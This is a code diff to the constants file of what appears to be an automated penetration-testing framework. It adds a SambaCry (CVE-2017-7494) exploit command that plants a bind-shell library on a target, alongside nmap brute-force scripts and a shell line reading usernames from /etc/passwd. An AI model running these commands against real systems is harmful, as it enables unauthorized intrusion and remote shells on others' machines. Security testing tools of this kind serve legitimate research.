@@ -242,7 +242,7 @@ class NMAP:
                         + SECLISTS.TOP_USERNAMES_SHORTLIST + ",pgsql-brute.timeout=8s,brute.firstonly=true"
     POSTGRES_BRUTE_HOST = "-p 5432 --script pgsql-brute --script-args userdb=" + SECLISTS.TOP_USERNAMES_SHORTLIST + ",passdb=" \
                       + SECLISTS.TOP_USERNAMES_SHORTLIST + ",pgsql-brute.timeout=8s,brute.firstonly=true"
-    SAMBA_CVE_2017_7494 = "--script smb-vuln-cve-2017-7494 --script-args smb-vuln-cve-2017-7494.check-version -p445"
+    SAMBA_CVE_2017_7494_SCAN = "--script smb-vuln-cve-2017-7494 --script-args smb-vuln-cve-2017-7494.check-version -p445"
     FIREWALK_HOST = "--script=firewalk --traceroute --script-args=firewalk.max-retries=1,firewalk.probe-timeout=800ms"
     HTTP_ENUM = "--script=http-enum"
     HTTP_GREP = "--script=http-grep"
@@ -410,6 +410,8 @@ class SSH_BACKDOOR:
 class SHELL:
     LIST_ALL_USERS = "cut -d: -f1 /etc/passwd"
     CHECK_FOR_SECLISTS = "test -e /SecLists && echo file exists || echo file not found"
+    SAMBA_EXPLOIT = "/samba_exploit.py -e /libbindshell-samba.so -s data -r /data/libbindshell-samba.so -u " \
+                    "sambacry -p nosambanocry -P 6699 -t "
 
 class EXPLOIT_VULNERABILITES:
     SSH_DICT_SAME_USER_PASS = "ssh-weak-password"
@@ -424,6 +426,8 @@ class EXPLOIT_VULNERABILITES:
     WEAK_PW_VULNS = [SSH_DICT_SAME_USER_PASS, FTP_DICT_SAME_USER_PASS, TELNET_DICTS_SAME_USER_PASS,
                      IRC_DICTS_SAME_USER_PASS, POSTGRES_DICTS_SAME_USER_PASS, SMTP_DICTS_SAME_USER_PASS,
                      MYSQL_DICTS_SAME_USER_PASS, MONGO_DICTS_SAME_USER_PASS, CASSANDRA_DICTS_SAME_USER_PASS]
+    SAMBACRY_EXPLOIT = "sambacry"
+    CVE_VULNS = [SAMBACRY_EXPLOIT]
     UNKNOWN = "unknown"
     WEAK_PASSWORD_CVSS = 10.0
 
